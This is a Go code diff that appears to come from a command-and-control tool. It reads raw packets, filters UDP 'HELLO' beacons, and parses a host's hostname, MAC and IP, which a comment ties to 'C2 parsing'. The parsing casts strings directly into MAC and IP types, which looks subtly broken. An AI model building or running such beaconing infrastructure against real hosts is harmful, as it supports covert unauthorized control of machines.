@@ -10,6 +10,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -48,6 +49,7 @@ func ReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	// sockaddr --> the sockaddr struct that the packet was read from
 	// err 		--> was there an error?
 	_, _, err := syscall.Recvfrom(fd, buf, 0)
+
 	checkEr(err)
 
 	// Filter packet?
@@ -66,7 +68,7 @@ func ReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
 		// Add logic to make sure this is my own shit
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
+		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO") {
 			return packet
 		}
 		return nil
@@ -78,19 +80,21 @@ func ReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 // ProcessPacket TODO:
 func ProcessPacket(packet gopacket.Packet) {
 
-	fmt.Println("Received packet! -->", string(packet.ApplicationLayer().Payload()))
+	data := string(packet.ApplicationLayer().Payload())
 
-	payload := string(packet.ApplicationLayer().Payload())
+	payload := strings.Split(data, " ")
 
-	strings.Split(payload, " ")
-	/*
-		typeOfMessage := payload[0]
-		hostname := payload[1]
-		mac := payload[2]
-		ip := payload[3]
+	typeOfMessage := payload[0]
+	id, err := strconv.Atoi(payload[1])
+	checkEr(err)
+	hostname := payload[2]
+	mac := net.HardwareAddr(payload[3])
+	ip := net.IP(payload[4])
 
-		fmt.Println()
-	*/
+	fmt.Println(typeOfMessage, id, hostname, mac, ip)
+
+	fmt.Println()
+
 }
 
 // CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
@@ -338,13 +342,13 @@ func GetRouterMAC() (net.HardwareAddr, error) {
 //
 //	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
 //			we are dealing with NAT. This will be handled by the C2 parsing
-func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
+func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP, count int) (hello string) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Fatal("Hostname not found...")
 	}
 
-	hello = "HELLO: " + hostname + " " + hostMAC.String() + " " + srcIP.String()
+	hello = "HELLO " + strconv.Itoa(count) + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
 
 	return hello
 }
